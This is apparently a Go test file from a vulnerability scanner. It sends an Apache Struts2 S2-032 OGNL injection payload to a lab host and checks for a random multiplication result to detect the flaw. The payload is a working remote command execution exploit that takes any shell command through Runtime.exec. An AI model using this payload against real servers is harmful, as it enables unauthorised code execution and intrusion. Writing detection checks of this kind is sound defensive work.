package test

import (
	"github.com/EmYiQing/XiuScan/core/http"
	"github.com/EmYiQing/XiuScan/core/tool"
	"github.com/EmYiQing/XiuScan/log"
	"net/url"
	"strconv"
	"strings"
	"testing"
)

func TestS2032(t *testing.T) {
	rand1 := tool.GetRandomInt()
	rand2 := tool.GetRandomInt()
	cmd := "expr __rand_1__ * __rand_2__"
	cmd = strings.ReplaceAll(cmd, "__rand_1__", strconv.Itoa(rand1))
	cmd = strings.ReplaceAll(cmd, "__rand_2__", strconv.Itoa(rand2))
	cmd = url.QueryEscape(cmd)
	payload := "/index.action?method:%23_memberAccess%3d@ognl.OgnlContext" +
		"@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletAct" +
		"ionContext%40getResponse(),%23res.setCharacterEncoding(%23parame" +
		"ters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3dnew+java." +
		"util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters." +
		"cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.pp%5B0%" +
		"5D),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B" +
		"0%5D,%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString" +
		"&pp=%5C%5CA&ppp=%20&encoding=UTF-8&cmd=__cmd__"
	payload = strings.ReplaceAll(payload, "__cmd__", cmd)
	output := tool.FormatPayload(payload)
	log.Info("payload: %s", output)
	req := &http.Request{
		Url:    http.NewUrl("http://192.168.222.132:8080" + payload),
		Method: "GET",
	}
	resp := http.DoRequest(req)
	if strings.Contains(string(resp.Body), strconv.Itoa(rand1*rand2)) {
		log.Info("find S2-032")
	}
}
